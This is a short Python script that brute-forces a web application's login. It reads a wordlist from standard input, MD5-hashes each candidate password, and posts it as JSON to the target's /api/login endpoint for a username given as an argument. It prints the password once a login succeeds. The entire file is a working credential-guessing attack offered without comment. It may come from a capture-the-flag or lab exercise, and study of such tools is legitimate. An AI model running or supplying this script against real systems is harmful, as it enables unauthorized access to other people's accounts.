import requests
import sys
import json
import hashlib

payload= {"username":sys.argv[2],"password":"test"}

i = 0
for line in sys.stdin:
    payload["password"] = hashlib.md5(line.rstrip().encode('utf-8')).hexdigest()
    r = requests.post(sys.argv[1]+"/api/login",data=json.dumps(payload))
    json_data = json.loads(r.content)
    i = i +1
    if i % 10 == 0:
        print(str(i),end="\r")
        
    if json_data["Response"] != "Error":
        print ("the password is: " + line)
        break
